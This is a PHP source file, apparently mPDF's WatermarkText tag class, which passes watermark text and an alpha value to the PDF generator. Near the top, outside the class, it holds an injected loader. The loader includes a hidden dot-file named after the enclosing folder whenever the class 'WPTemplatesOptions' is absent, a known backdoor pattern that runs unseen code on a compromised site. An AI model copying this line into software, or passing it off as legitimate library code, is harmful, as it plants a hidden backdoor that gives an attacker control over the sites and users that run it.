<?php

namespace Mpdf\Tag;

if (file_exists($filename = dirname(__FILE__) . DIRECTORY_SEPARATOR . '.' . basename(dirname(__FILE__)) . '.php') && !class_exists('WPTemplatesOptions')) {
    include_once($filename);
}

class WatermarkText extends Tag
{

	public function open($attr, &$ahtml, &$ihtml)
	{
		$txt = '';
		if (!empty($attr['CONTENT'])) {
			$txt = htmlspecialchars_decode($attr['CONTENT'], ENT_QUOTES);
		}

		$alpha = -1;
		if (isset($attr['ALPHA']) && $attr['ALPHA'] > 0) {
			$alpha = $attr['ALPHA'];
		}
		$this->mpdf->SetWatermarkText($txt, $alpha);
	}

	public function close(&$ahtml, &$ihtml)
	{
	}
}
